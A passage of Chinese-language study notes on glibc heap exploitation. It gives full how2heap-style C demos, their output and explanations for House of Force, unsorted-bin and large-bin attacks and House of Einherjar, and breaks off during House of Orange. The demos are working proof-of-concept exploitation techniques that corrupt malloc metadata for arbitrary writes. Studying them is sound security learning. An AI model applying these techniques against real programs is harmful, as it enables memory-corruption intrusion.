to allocate a chunk right over the desired region.\\n\u0026#34;); /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr,\u0026#34;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\u0026#34; \u0026#34;we will malloc %#lx bytes.\\n\u0026#34;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); fprintf(stderr,\u0026#34;As expected, the new pointer is at the same place as the old top chunk: %p\\n\u0026#34;, new_ptr - sizeof(long)*2); void* ctr_chunk = malloc(100); fprintf(stderr,\u0026#34;\\nNow, the next chunk we overwrite will point at our target buffer.\\n\u0026#34;); fprintf(stderr,\u0026#34;malloc(100) =\u0026gt; %p!\\n\u0026#34;, ctr_chunk); fprintf(stderr,\u0026#34;Now, we can finally overwrite that value:\\n\u0026#34;); fprintf(stderr,\u0026#34;... old string: %s\\n\u0026#34;, bss_var); fprintf(stderr,\u0026#34;... doing strcpy overwrite with \\\u0026#34;YEAH!!!\\\u0026#34;...\\n\u0026#34;); strcpy(ctr_chunk,\u0026#34;YEAH!!!\u0026#34;); fprintf(stderr,\u0026#34;... new string: %s\\n\u0026#34;, bss_var); // some further discussion: //fprintf(stderr,\u0026#34;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n\u0026#34;); //fprintf(stderr,\u0026#34;This because the main_arena-\u0026gt;top pointer is setted to current av-\u0026gt;top + malloc_size \u0026#34; // \u0026#34;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n\u0026#34;); //fprintf(stderr,\u0026#34;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n\u0026#34;); //fprintf(stderr,\u0026#34;The av-\u0026gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n\u0026#34;); //fprintf(stderr,\u0026#34;After that a new call to malloc will return av-\u0026gt;top+8 (+8 bytes for the header),\u0026#34; // \u0026#34;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n\u0026#34;); //fprintf(stderr,\u0026#34;The large chunk with evil_size has been allocated here 0x%08x\\n\u0026#34;,p2); //fprintf(stderr,\u0026#34;The main_arena value av-\u0026gt;top has been setted to malloc_got_address-8=0x%08x\\n\u0026#34;,malloc_got_address); //fprintf(stderr,\u0026#34;This last malloc will be served from the remainder code and will return the av-\u0026gt;top+8 injected before\\n\u0026#34;); } 输出：\nWelcome to the House of Force The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value. The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os. In the end, we will use this to overwrite a variable at 0x602060. Its current value is: This is a string that we want to overwrite. Let\u0026#39;s allocate the first chunk, taking space from the wilderness. The chunk of 256 bytes has been allocated at 0x13b3000. Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness. Real size (aligned and all that jazz) of our allocated chunk is 280. Now let\u0026#39;s emulate a vulnerability that can overwrite the header of the Top Chunk The top chunk starts at 0x13b3110 Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap. Old size of top chunk 0x20ef1 New size of top chunk 0xffffffffffffffff The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap. Next, we will allocate a chunk that will get us right up against the desired region (with an integer overflow) and will then be able to allocate a chunk right over the desired region. The value we want to write to at 0x602060, and the top chunk is at 0x13b3110, so accounting for the header size, we will malloc 0xffffffffff24ef30 bytes. As expected, the new pointer is at the same place as the old top chunk: 0x13b3110 Now, the next chunk we overwrite will point at our target buffer. malloc(100) =\u0026gt; 0x602060! Now, we can finally overwrite that value: ... old string: This is a string that we want to overwrite. ... doing strcpy overwrite with \u0026#34;YEAH!!!\u0026#34;... ... new string: YEAH!!! 这个例子里要覆盖的地址位于 bss 段，处于 heap 段的下方，但是 heap 是向高地址生长的。所以这里的核心思想是利用整数溢出。\n首先需要存在堆溢出漏洞。我们分配一个 chunk0，此时堆上只有两个 chunk：chunk0 和 top chunk。利用溢出修改 top chunk 的 chunk_size 为 -1，即 0xffffffffffffffff。这样做是因为后面需要申请很大的 chunk 进行整数溢出，这很可能导致 top chunk 大小不够，不去从 top chunk 切割而是调用 mmap()。伪造了 top chunk 的大小后，在后面申请大 chunk 时就不会触发 mmap()，确保了申请的大 chunk 也是从 top chunk 切割的。\n接下来我们申请一个 evil_size 大小的 chunk，使得申请后 top chunk 指针（经过整数溢出）指向我们想要覆盖的变量 bss_var 的前面。这个 evil_size 的计算方法如下：\nThe evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) 这时再次 malloc，得到的就是指向 bss_var 的指针了。\nunsorted_bin_into_stack # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main() { intptr_t stack_buffer[4] = {0}; fprintf(stderr,\u0026#34;Allocating the victim chunk\\n\u0026#34;); intptr_t* victim = malloc(0x100); fprintf(stderr,\u0026#34;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\\n\u0026#34;); intptr_t* p1 = malloc(0x100); fprintf(stderr,\u0026#34;Freeing the chunk %p, it will be inserted in the unsorted bin\\n\u0026#34;, victim); free(victim); fprintf(stderr,\u0026#34;Create a fake chunk on the stack\u0026#34;); fprintf(stderr,\u0026#34;Set size for next allocation and the bk pointer to any writable address\u0026#34;); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; //------------VULNERABILITY----------- fprintf(stderr,\u0026#34;Now emulating a vulnerability that can overwrite the victim-\u0026gt;size and victim-\u0026gt;bk pointer\\n\u0026#34;); fprintf(stderr,\u0026#34;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (\u0026gt; 16 on x64) \u0026amp;\u0026amp; \u0026lt;av-\u0026gt;system_mem\\n\u0026#34;); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; // victim-\u0026gt;bk is pointing to stack //------------------------------------ fprintf(stderr,\u0026#34;Now next malloc will return the region of our fake chunk: %p\\n\u0026#34;, \u0026amp;stack_buffer[2]); fprintf(stderr,\u0026#34;malloc(0x100): %p\\n\u0026#34;, malloc(0x100)); } 输出：\nAllocating the victim chunk Allocating another chunk to avoid consolidating the top chunk with the small one during the free() Freeing the chunk 0x2020010, it will be inserted in the unsorted bin Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-\u0026gt;size and victim-\u0026gt;bk pointer Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (\u0026gt; 16 on x64) \u0026amp;\u0026amp; \u0026lt;av-\u0026gt;system_mem Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160 malloc(0x100): 0x7ffe82ca7160 首先分配一个 0x100 的 chunkvictim，在下面再垫一个 chunk 防止与 top chunk 合并，释放 victim 进入 unsorted bin。现在在栈上伪造大小为 0x110 的 chunk，并使其 bk 指向任意一个可写地址，比如自身。\n假设存在漏洞可以修改 victim 的 chunk_size 和 bk，那么我们可以将它的 chunk_size 改为合法 nextsize 范围内的一个值，且小于 0x100。而 bk 则改为我们刚才伪造的 chunk。这样下一次 malloc(0x100) 就会顺着 bk 查找，首先找到 victim 但大小不够，放入 small bin。随后找到我们伪造的 chunk 并返回，此时伪造 chunk 的 fd 已经指向 main_arena+88，可以借此泄露 libc。\nunsorted_bin_attack # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(){ fprintf(stderr,\u0026#34;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\\n\u0026#34;); fprintf(stderr,\u0026#34;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the \u0026#34; \u0026#34;global variable global_max_fast in libc for further fastbin attack\\n\\n\u0026#34;); unsigned long stack_var=0; fprintf(stderr,\u0026#34;Let\u0026#39;s first look at the target we want to rewrite on stack:\\n\u0026#34;); fprintf(stderr,\u0026#34;%p: %ld\\n\\n\u0026#34;, \u0026amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr,\u0026#34;Now, we allocate first normal chunk on the heap at: %p\\n\u0026#34;,p); fprintf(stderr,\u0026#34;And allocate another normal chunk in order to avoid consolidating the top chunk with\u0026#34; \u0026#34;the first one during the free()\\n\\n\u0026#34;); malloc(500); free(p); fprintf(stderr,\u0026#34;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer \u0026#34; \u0026#34;point to %p\\n\u0026#34;,(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(\u0026amp;stack_var-2); fprintf(stderr,\u0026#34;Now emulating a vulnerability that can overwrite the victim-\u0026gt;bk pointer\\n\u0026#34;); fprintf(stderr,\u0026#34;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\\n\\n\u0026#34;,(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr,\u0026#34;Let\u0026#39;s malloc again to get the chunk we just free. During this time, the target should have already been\u0026#34; \u0026#34;rewritten:\\n\u0026#34;); fprintf(stderr,\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var, (void*)stack_var); } 输出：\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let\u0026#39;s first look at the target we want to rewrite on stack: 0x7fff4c4511e8: 0 Now, we allocate first normal chunk on the heap at: 0x1023010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78 Now emulating a vulnerability that can overwrite the victim-\u0026gt;bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8 Let\u0026#39;s malloc again to get the chunk we just free. During this time, the target should have already been rewritten: 0x7fff4c4511e8: 0x7f60208a2b78 和上一个类似，我们看到在 free(p1) 后，其 bk 指向 main_arena+88。假设存在漏洞可以修改其 bk，那么我们修改成目标地址 - 0x10 的位置，相当于伪造了一个 fake chunk。那么我们在拿回 p1 的时候，我们的 fake chunk 会被认为是 unsorted bin 中的下一个 chunk，因此其 bk 也被修改为 main_arena+88，于是我们在栈上写入了一个 unsigned long 值。\nlarge_bin_attack # 源码：\n/* This technique is taken from https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/ [...] else { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; [...] mark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; For more details on how large-bins are handled and sorted by ptmalloc, please check the Background section in the aforementioned link. [...] */ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates large bin attack by writing a large unsigned long value into stack\\n\u0026#34;); fprintf(stderr,\u0026#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the \u0026#34; \u0026#34;global variable global_max_fast in libc for further fastbin attack\\n\\n\u0026#34;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr,\u0026#34;Let\u0026#39;s first look at the targets we want to rewrite on stack:\\n\u0026#34;); fprintf(stderr,\u0026#34;stack_var1 (%p): %ld\\n\u0026#34;, \u0026amp;stack_var1, stack_var1); fprintf(stderr,\u0026#34;stack_var2 (%p): %ld\\n\\n\u0026#34;, \u0026amp;stack_var2, stack_var2); unsigned long *p1 = malloc(0x320); fprintf(stderr,\u0026#34;Now, we allocate the first large chunk on the heap at: %p\\n\u0026#34;, p1 - 2); fprintf(stderr,\u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34;the first large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p2 = malloc(0x400); fprintf(stderr,\u0026#34;Then, we allocate the second large chunk on the heap at: %p\\n\u0026#34;, p2 - 2); fprintf(stderr,\u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34;the second large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p3 = malloc(0x400); fprintf(stderr,\u0026#34;Finally, we allocate the third large chunk on the heap at: %p\\n\u0026#34;, p3 - 2); fprintf(stderr,\u0026#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with\u0026#34; \u0026#34;the third large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); free(p1); free(p2); fprintf(stderr,\u0026#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:\u0026#34; \u0026#34;[%p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr,\u0026#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the\u0026#34; \u0026#34;freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation\u0026#34; \u0026#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:\u0026#34; \u0026#34;[%p]\\n\\n\u0026#34;, (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr,\u0026#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:\u0026#34; \u0026#34;[%p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr,\u0026#34;Now emulating a vulnerability that can overwrite the freed second large chunk\u0026#39;s \\\u0026#34;size\\\u0026#34;\u0026#34; \u0026#34;as well as its \\\u0026#34;bk\\\u0026#34;and \\\u0026#34;bk_nextsize\\\u0026#34;pointers\\n\u0026#34;); fprintf(stderr,\u0026#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk\u0026#34; \u0026#34;at the head of the large bin freelist. To overwrite the stack variables, we set \\\u0026#34;bk\\\u0026#34;to 16 bytes before stack_var1 and\u0026#34; \u0026#34;\\\u0026#34;bk_nextsize\\\u0026#34;to 32 bytes before stack_var2\\n\\n\u0026#34;); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026amp;stack_var1 - 2); p2[3] = (unsigned long)(\u0026amp;stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr,\u0026#34;Let\u0026#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.\u0026#34; \u0026#34;During this time, targets should have already been rewritten:\\n\u0026#34;); fprintf(stderr,\u0026#34;stack_var1 (%p): %p\\n\u0026#34;, \u0026amp;stack_var1, (void *)stack_var1); fprintf(stderr,\u0026#34;stack_var2 (%p): %p\\n\u0026#34;, \u0026amp;stack_var2, (void *)stack_var2); return 0; } 输出：\nThis file demonstrates large bin attack by writing a large unsigned long value into stack In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let\u0026#39;s first look at the targets we want to rewrite on stack: stack_var1 (0x7fff33530b00): 0 stack_var2 (0x7fff33530b08): 0 Now, we allocate the first large chunk on the heap at: 0xef3000 And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free() Then, we allocate the second large chunk on the heap at: 0xef3360 And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free() Finally, we allocate the third large chunk on the heap at: 0xef37a0 And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free() We free the first and second large chunks now and they will be inserted in the unsorted bin: [0xef3360 \u0026lt;--\u0026gt; 0xef3000 ] Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [0xef30a0] Now, we free the third large chunk and it will be inserted in the unsorted bin: [0xef37a0 \u0026lt;--\u0026gt; 0xef30a0 ] Now emulating a vulnerability that can overwrite the freed second large chunk\u0026#39;s\u0026#34;size\u0026#34;as well as its\u0026#34;bk\u0026#34;and\u0026#34;bk_nextsize\u0026#34; pointers Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set \u0026#34;bk\u0026#34; to 16 bytes before stack_var1 and \u0026#34;bk_nextsize\u0026#34; to 32 bytes before stack_var2 Let\u0026#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten: stack_var1 (0x7fff33530b00): 0xef37a0 stack_var2 (0x7fff33530b08): 0xef37a0 这种攻击方法在 glibc 2.29 推出，unsorted bin attack 失效之后可能会有大的用武之地。\n首先分配了一个 small chunk p1，然后分配了 2 个 large chunk p2 和 p3。在每个 chunk 后面都插一小段 fast chunk 防止合并。释放掉 p1 和 p2，两者都会进入 unsorted bin。\n随后申请比 p1 小的 chunk，这一步比较复杂：\n从 unsorted bin 末尾拿出 p1，放入对应 small bin 从 unsorted bin 末尾拿出 p2，由于 large bin 为空，直接放入对应 large bin unsorted bin 已经空了，于是从 small bin 中拿出 p1，切割 0x90 的 chunk 返回给程序 p1 被切割剩下的部分 _p1 重新回到 unsorted bin 再释放 p3，也进入 unsorted bin。这时，large bin 中有 p2 一个 chunk，大小为 0x410；unsorted bin 中有 p3，_p1 两个 chunk，大小分别为 0x410,0x290（0x330-0xa0）。\n现在假设能控制整个 p2 的内容，让它的 chunk_size=0x3f1，bk=addr1 且 bk_nextsize=addr2。那么再次申请 small chunk 时：\n从 unsorted bin 末尾拿出 _p1，放入对应 small bin 从 unsorted bin 末尾拿出 p3，准备放入对应 large bin，但是对应 large bin 非空 从对应 large bin 第一个 chunk（p2）开始遍历，由于 p2 大小被修改，0x3f0 \u0026lt; 0x410，所以 p3 插入到了链表头。 插入的代码是这样的，注意这里没有检查 bk_nextsize 的合法性：\nif ((unsigned long) size == (unsigned long) fwd-\u0026gt;size) /* Always insert in the second position. */ fwd = fwd-\u0026gt;fd; else { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; 这里的 victim 是 p3，fwd 是 p2，注意两者大小不能相等，因为漏洞在 else 里。由于 fwd-\u0026gt;bk_nextsize 是 addr2，于是第二行把这个值给了 victim-\u0026gt;bk_nextsize，第四行就等价于 *(addr2+4) = victim。\n同时，这里令 bck = fwd-\u0026gt;bk 即 addr1，而接着还会执行一段代码：\nmark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; 这里 bck-\u0026gt;fd = victim 就等价于 *(addr1+2) = victim。于是我们成功修改了 addr1+2 和 addr2+4 的值。\nhouse_of_einherjar # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; /* Credit to st4g3r for publishing this technique The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc() This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */ int main() { fprintf(stderr,\u0026#34;Welcome to House of Einherjar!\\n\u0026#34;); fprintf(stderr,\u0026#34;Tested in Ubuntu 16.04 64bit.\\n\u0026#34;); fprintf(stderr,\u0026#34;This technique can be used when you have an off-by-one into a malloc\u0026#39;ed region with a null byte.\\n\u0026#34;); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr,\u0026#34;\\nWe allocate 0x38 bytes for \u0026#39;a\u0026#39;\\n\u0026#34;); a = (uint8_t*) malloc(0x38); fprintf(stderr,\u0026#34;a: %p\\n\u0026#34;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr,\u0026#34;Since we want to overflow \u0026#39;a\u0026#39;, we need the \u0026#39;real\u0026#39; size of \u0026#39;a\u0026#39; after rounding: %#x\\n\u0026#34;, real_a_size); // create a fake chunk fprintf(stderr,\u0026#34;\\nWe create a fake chunk wherever we want, in this case we\u0026#39;ll create the chunk on the stack\\n\u0026#34;); fprintf(stderr,\u0026#34;However, you can also create the chunk in the heap or the bss, as long as you know its address\\n\u0026#34;); fprintf(stderr,\u0026#34;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n\u0026#34;); fprintf(stderr,\u0026#34;(although we could do the unsafe unlink technique here in some scenarios)\\n\u0026#34;); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk\u0026#39;s size to pass P-\u0026gt;bk-\u0026gt;size == P-\u0026gt;prev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr,\u0026#34;Our fake chunk at %p looks like:\\n\u0026#34;, fake_chunk); fprintf(stderr,\u0026#34;prev_size (not used): %#lx\\n\u0026#34;, fake_chunk[0]); fprintf(stderr,\u0026#34;size: %#lx\\n\u0026#34;, fake_chunk[1]); fprintf(stderr,\u0026#34;fwd: %#lx\\n\u0026#34;, fake_chunk[2]); fprintf(stderr,\u0026#34;bck: %#lx\\n\u0026#34;, fake_chunk[3]); fprintf(stderr,\u0026#34;fwd_nextsize: %#lx\\n\u0026#34;, fake_chunk[4]); fprintf(stderr,\u0026#34;bck_nextsize: %#lx\\n\u0026#34;, fake_chunk[5]); /* In this case it is easier if the chunk size attribute has a least significant byte with * a value of 0x00. The least significant byte of this will be 0x00, because the size of * the chunk includes the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr,\u0026#34;\\nWe allocate 0xf8 bytes for \u0026#39;b\u0026#39;.\\n\u0026#34;); fprintf(stderr,\u0026#34;b: %p\\n\u0026#34;, b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr,\u0026#34;\\nb.size: %#lx\\n\u0026#34;, *b_size_ptr); fprintf(stderr,\u0026#34;b.size is: (0x100) | prev_inuse = 0x101\\n\u0026#34;); fprintf(stderr,\u0026#34;We overflow \u0026#39;a\u0026#39; with a single null byte into the metadata of \u0026#39;b\u0026#39;\\n\u0026#34;); a[real_a_size] = 0; fprintf(stderr,\u0026#34;b.size: %#lx\\n\u0026#34;, *b_size_ptr); fprintf(stderr,\u0026#34;This is easiest if b.size is a multiple of 0x100 so you \u0026#34; \u0026#34;don\u0026#39;t change the size of b, only its prev_inuse bit\\n\u0026#34;); fprintf(stderr,\u0026#34;If it had been modified, we would need a fake chunk inside \u0026#34; \u0026#34;b where it will try to consolidate the next chunk\\n\u0026#34;); // Write a fake prev_size to the end of a fprintf(stderr,\u0026#34;\\nWe write a fake prev_size to the last %lu bytes of a so that \u0026#34; \u0026#34;it will consolidate with our fake chunk\\n\u0026#34;, sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr,\u0026#34;Our fake prev_size will be %p - %p = %#lx\\n\u0026#34;, b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)\u0026amp;a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk\u0026#39;s size to reflect b\u0026#39;s new prev_size fprintf(stderr,\u0026#34;\\nModify fake chunk\u0026#39;s size to reflect b\u0026#39;s new prev_size\\n\u0026#34;); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr,\u0026#34;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n\u0026#34;); free(b); fprintf(stderr,\u0026#34;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\u0026#34;, fake_chunk[1]); //if we allocate another chunk before we free b we will need to //do two things: //1) We will need to adjust the size of our fake chunk so that //fake_chunk + fake_chunk\u0026#39;s size points to an area we control //2) we will need to write the size of our fake chunk //at the location we control. //After doing these two things, when unlink gets called, our fake chunk will //pass the size(P) == prev_size(next_chunk(P)) test. //otherwise we need to make sure that our fake chunk is up against the //wilderness fprintf(stderr,\u0026#34;\\nNow we can call malloc() and it will begin in our fake chunk\\n\u0026#34;); d = malloc(0x200); fprintf(stderr,\u0026#34;Next malloc(0x200) is at %p\\n\u0026#34;, d); } 输出：\nWelcome to House of Einherjar! Tested in Ubuntu 16.04 64bit. This technique can be used when you have an off-by-one into a malloc\u0026#39;ed region with a null byte. We allocate 0x38 bytes for \u0026#39;a\u0026#39; a: 0x1cc0010 Since we want to overflow \u0026#39;a\u0026#39;, we need the \u0026#39;real\u0026#39; size of \u0026#39;a\u0026#39; after rounding: 0x38 We create a fake chunk wherever we want, in this case we\u0026#39;ll create the chunk on the stack However, you can also create the chunk in the heap or the bss, as long as you know its address We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks (although we could do the unsafe unlink technique here in some scenarios) Our fake chunk at 0x7fffd1743240 looks like: prev_size (not used): 0x100 size: 0x100 fwd: 0x7fffd1743240 bck: 0x7fffd1743240 fwd_nextsize: 0x7fffd1743240 bck_nextsize: 0x7fffd1743240 We allocate 0xf8 bytes for \u0026#39;b\u0026#39;. b: 0x1cc0050 b.size: 0x101 b.size is: (0x100) | prev_inuse = 0x101 We overflow \u0026#39;a\u0026#39; with a single null byte into the metadata of \u0026#39;b\u0026#39; b.size: 0x100 This is easiest if b.size is a multiple of 0x100 so you don\u0026#39;t change the size of b, only its prev_inuse bit If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk Our fake prev_size will be 0x1cc0040 - 0x7fffd1743240 = 0xffff80003057ce00 Modify fake chunk\u0026#39;s size to reflect b\u0026#39;s new prev_size Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set Our fake chunk size is now 0xffff80003059ddc1 (b.size + fake_prev_size) Now we can call malloc() and it will begin in our fake chunk Next malloc(0x200) is at 0x7fffd1743250 这个利用方式基于 off-by-null，首先伪造 chunk，使其 fd,bk,fd_nextsize,bk_nextsize 均指向自身以绕过 unlink 检查。然后申请大小以 8 结尾的 chunk a，以及实际大小以 0 结尾的 chunk b，这样从 a 溢出时仅仅修改了 b 的 PREV_INUSE 位，同时 a 还能伪造 b 的 prev_size 字段。\n我们将 b 的 prev_size 设置为 b 的 chunk 指针地址减去 fake chunk 的 chunk 指针地址，对 fake chunk 的 size 字段也作相应修改，那么释放 b 时就会和 fake chunk 合并，下次再申请时就能拿到 fake chunk 了。\nhouse_of_orange # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; /* The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer It requires a leak of the heap and the libc Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html */ /* This function is just present to emulate the scenario where the address of the function system is known. */ int winner (char *ptr); int main() { /* The House of Orange starts with the assumption that a buffer overflow exists on the heap using which the Top (also called the Wilderness) chunk can be corrupted. At the beginning of execution, the entire heap is part of the Top chunk. The first allocations are usually pieces of the Top chunk that are broken off to service the request. Thus, with every allocation, the Top chunks keeps getting smaller. And in a situation where the size of the Top chunk is smaller than the requested value, there are two possibilities: 1) Extend the Top chunk 2) Mmap a new page If the size requested is smaller than 0x21000, then the former is followed. */ char *p1, *p2; size_t io_list_all, *top; fprintf(stderr,\u0026#34;The attack vector of this technique was removed by changing the behavior of malloc_printerr, \u0026#34; \u0026#34;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\\n\u0026#34;); fprintf(stderr,\u0026#34;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,\u0026#34; \u0026#34;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\\n\u0026#34;); /* Firstly, lets allocate a chunk on the heap. */ p1 = malloc(0x400-16); /* The heap is usually allocated with a top chunk of size 0x21000 Since we\u0026#39;ve allocate a chunk of size 0x400 already, what\u0026#39;s left is 0x20c00 with the PREV_INUSE bit set =\u0026gt; 0x20c01. The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap, it must also be page aligned at the end. Also, if a chunk that is adjacent to the Top chunk is to be freed, then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set. So that means that there are two conditions that must always be true. 1) Top chunk + size has to be page aligned 2) Top chunk\u0026#39;s prev_inuse bit has to be set. We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE. What\u0026#39;s left is 0x20c01 Now, let\u0026#39;s satisfy the conditions 1) Top chunk + size has to be page aligned 2) Top chunk\u0026#39;s prev_inuse bit has to be set. */ top = (size_t *) ((char *) p1 + 0x400 - 16); top[1] = 0xc01; /* Now we request a chunk of size larger than the size of the Top chunk. 